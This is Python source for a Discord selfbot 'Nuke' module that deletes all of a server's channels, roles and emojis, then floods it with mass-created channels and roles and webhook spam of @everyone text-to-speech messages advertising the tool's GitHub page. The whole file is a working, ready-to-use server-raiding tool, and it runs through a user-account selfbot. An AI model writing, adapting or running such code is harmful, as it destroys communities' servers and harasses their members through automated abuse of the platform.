import discord
from discord.ext import commands
import random, string
from asyncio import sleep, create_task
import json

with open("config.json", "r", encoding="utf-8-sig") as f:
	config = json.load(f)

async def remove(object):
	try: await object.delete()
	except: pass
async def check(ctx):
	if not config['nuke_commands']:
		await ctx.message.edit(content='**__Selfbot by LALOL__\n\n:warning: Краш команды отключены! Для того чтобы включить краш команды измените файл config.json**')
		return False
	try: await ctx.message.delete()
	except:	pass
	return True
async def create_channel(guild, name):
	try:await guild.create_text_channel(name=name, topic='**__Selfbot by LALOL https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot https://github.com/Its-LALOL/Discord-Selfbot__**')
	except:pass
async def create_webhook(channel, message):
	try:webhook=await channel.create_webhook(name='Selfbot by LALOL')
	except:pass
	create_task(spam(webhook, message))
async def spam(webhook, message):
	for i in range(200):
		try:await webhook.send(message, tts=True)
		except:pass
class Nuke(commands.Cog):
	def __init__(self, bot):
		self.bot = bot
	@commands.command()
	async def deletechannels(self, ctx):
		if await check(ctx):
			for channel in ctx.guild.channels:
				create_task(remove(channel))
	@commands.command()
	async def deleteroles(self, ctx):
		if await check(ctx):
			for role in ctx.guild.roles:
				create_task(remove(role))
	@commands.command()
	async def deleteemojis(self, ctx):
		if await check(ctx):
			for emoji in ctx.guild.emojis:
				create_task(remove(emoji))
	@commands.command()
	async def deleteall(self, ctx):
		if await check(ctx):
			create_task(Nuke.deleteroles(self, ctx))
			create_task(Nuke.deleteemojis(self, ctx))
			create_task(Nuke.deletechannels(self, ctx))
	@commands.command()
	async def spamchannels(self, ctx, *, name='Selfbot by LALOL'):
		if await check(ctx):
			for i in range(50):
				create_task(create_channel(ctx.guild, name))
	@commands.command()
	async def spamwebhooks(self, ctx, *, message='||@everyone|| **__Selfbot by LALOL__ https://github.com/Its-LALOL/Discord-Selfbot**'):
		if await check(ctx):
			for channel in ctx.guild.text_channels:
				for webhook in await channel.webhooks():
						create_task(spam(webhook, message))
			for channel in ctx.guild.text_channels:
				create_task(create_webhook(channel, message))
	@commands.command()
	async def spamroles(self, ctx, *, name='Selfbot by LALOL'):
		if await check(ctx):
			for i in range(50):
				try:await ctx.guild.create_role(name=name)
				except:return
	@commands.command()
	async def nuke(self, ctx):
		if await check(ctx):
			create_task(Nuke.deleteall(self, ctx))
			create_task(Nuke.spamroles(self, ctx))
			create_task(Nuke.spamchannels(self, ctx))
			await sleep(20)
			create_task(Nuke.spamwebhooks(self, ctx))
def setup(bot):
	bot.add_cog(Nuke(bot))
